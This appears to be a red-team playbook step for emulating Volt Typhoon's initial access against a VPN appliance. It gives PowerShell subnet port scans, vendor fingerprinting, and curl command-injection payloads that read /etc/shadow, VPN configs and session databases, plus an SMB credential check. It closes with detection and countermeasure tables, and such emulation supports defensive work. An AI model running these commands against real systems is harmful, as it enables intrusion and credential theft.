# Step 1: Initial Access

**Objective**: Exploit unpatched RCE CVE on VPN

---

## Context

- NEED ADDITIONAL INFO: VPN product/version to ID known vulnerabilities
- Target system: `dmz-vpn-elcoop-01`
- Scenario: Emulate PRC state-sponsored threat actor Volt Typhoon in performing stealthy LOLBAS attack

---

## Execution

### 1. Identify VPN Device

| **Goal**                   | **Description**                                                   | **Action**             |
|----------------------------|-------------------------------------------------------------------|------------------------------|
| Scan for VPN-related ports  | Test common VPN ports (443, 1194, 500, 4500, 80, 8080) across subnet | `Scan-VPNPorts`               |
| Check OpenVPN (TCP 1194)   | Test if TCP port 1194 responds (OpenVPN)                         | `Test-OpenVPNPort`            |
| Identify IPSec (UDP 500/4500) | UDP not supported by Test-NetConnection, requires logs or EDR   | *N/A - use passive logging*  |
| Check HTTP VPN portals     | Send web request to HTTP port and check response                 | `Check-HTTPPortal`            |
| Inspect HTTPS banner       | Pull HTTPS response headers for service fingerprinting           | `Inspect-HTTPSBanner`         |
| Extract SSL certificate    | View SSL certificate to identify VPN vendor                      | `Extract-SSLCert`             |
| Save results to file       | Log responsive IPs and ports                                     | *Append `Out-File` as needed* |

- Code Snippets

```
# Scan-VPNPorts
$subnet = "10.0.10"
$ports = @(443, 1194, 500, 4500, 80, 8080)

foreach ($i in 1..254) {
    $ip = "$subnet.$i"
    foreach ($port in $ports) {
        $result = Test-NetConnection -ComputerName $ip -Port $port -InformationLevel Quiet
        if ($result) {
            Write-Output "$ip:$port is open"
        }
    }
}
```

```
# Test-OpenVPNPort
Test-NetConnection -ComputerName 10.0.10.25 -Port 1194 -InformationLevel Quiet
```

```
# Check-HTTPPortal
Invoke-WebRequest -Uri http://10.0.10.25 -UseBasicParsing -TimeoutSec 3
```

```
# Inspect-HTTPSBanner
Invoke-WebRequest -Uri https://10.0.10.25 -UseBasicParsing -SkipCertificateCheck
```

```
# Extract-SSLCert
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$req = [System.Net.WebRequest]::Create('https://10.0.10.25')
$res = $req.GetResponse()
```


### 2. Fingerprint VPN 

- Gather data from banners, HTTP headers, or login pages:
  - Vendor branding (logo, HTML titles, favicon)
  - Login form patterns (e.g., /remote/login, /sslvpn/portal)
  - SSL certificate CN and issuer


| Indicator                 | Possible Vendor     |
| ------------------------- | ------------------- |
| `/remote/login`           | Fortinet, Palo Alto |
| `/dana-na/`               | Ivanti/Pulse Secure |
| `/ssl-vpn/login.cgi`      | SonicWall           |
| `CN=firewall.company.com` | Sophos, WatchGuard  |

### 3. Match to Known CVEs

- Once vendor and version are suspected, search for public vulnerabilities:
  - Use Shodan, Exploit-DB, CISA KEV List, or Rapid7 AttackerKB

- Prioritize remote code execution (RCE) or auth bypass CVEs

- Example queries:

```
"[vendor] VPN CVE RCE"
"[vendor] SSL VPN exploit GitHub"
```

### 4. Execute RCE or Authentication Bypass

- Identify the vulnerable endpoint or API
  - Use intercepting proxies like Burp Suite or manual analysis of the web interface
  - Look for HTTP endpoints accepting commands or parameters (e.g., /api/execute, /cgi-bin/, /admin/)

- Utilize payloads to execute commands remotely
Try injecting system commands in parameters or POST bodies, confirming command execution
```
curl -k -X POST "https://dmz-vpn-elcoop-01/api/execute" \
  -H "Content-Type: application/json" \
  -d '{"command":"id"}'
```
   Or, if parameters are in URL:

```
curl -k "https://dmz-vpn-elcoop-01/cgi-bin/vulnerable?cmd=whoami"
```

- Read credential files
  - Additional targets:
    - VPN config (/etc/vpn/config.conf)
    - Session database files (e.g., /var/lib/session.db)
```
curl -k -X POST "https://dmz-vpn-elcoop-01/api/execute" \
  -H "Content-Type: application/json" \
  -d '{"command":"cat /etc/passwd"}'
```

### 5. Extract Credentials 

- Dump local passwords, session files, config files, etc.

Dump config files
```
curl -k -X POST "https://dmz-vpn-elcoop-01/api/execute" \
  -H "Content-Type: application/json" \
  -d '{"command":"cat /etc/vpn/config.xml"}'
```

Dump session database
```
curl -k -X POST "https://dmz-vpn-elcoop-01/api/execute" \
  -H "Content-Type: application/json" \
  -d '{"command":"cat /var/lib/session.db"}'
``` 

Read local Linux password file
```
curl -k -X POST "https://dmz-vpn-elcoop-01/api/execute" \
  -H "Content-Type: application/json" \
  -d '{"command":"cat /etc/shadow"}'
```

Extract environment variables

```
curl -k -X POST "https://dmz-vpn-elcoop-01/api/execute" \
  -H "Content-Type: application/json" \
  -d '{"command":"printenv"}'
```
---

### 6. Validate Access

- Validate credentials with SMB authentication tests

```
net use \\TARGET_IP\C$ /user:DOMAIN\username password
```


## Result

- Grant shell access to VPN device
- Acquire and validate session domain credentials
- Establish initial foothold in dmz-subnet on `dmz-vpn-elcoop-01`



---

## Detection Opportunities
| **Vector**                   | **Description**                                                                       |
| ---------------------------- | ------------------------------------------------------------------------------------- |
| Exploit Attempt via VPN RCE  | Monitor for abnormal HTTP/S requests to VPN endpoints matching known RCE CVEs.        |
| Unusual VPN Session Patterns | Detect logins from anomalous IPs, geolocations, or odd hours.                         |
| Unexpected User Logins       | Alert on first-time logins from users to the VPN or DMZ systems.                      |
| Concurrent Sessions          | Flag if user accounts have overlapping sessions or logins from multiple IPs.          |
| VPN Log File Anomalies       | Review logs for failed logins, sudden configuration changes, or privilege escalation. |
| Credential Capture Behavior  | Monitor memory access or processes indicative of credential scraping tools.           |


---

## Defensive Countermeasures
- Enforce MFA for all VPN logins to reduce credential misuse
- Rotate VPN service credentials regularly and avoid hardcoding passwords
- Honeypot VPN gateway with decoy VPN applicances to detect scanning/exploitation
- Automatically flag suspicious VPN sessions (new users)

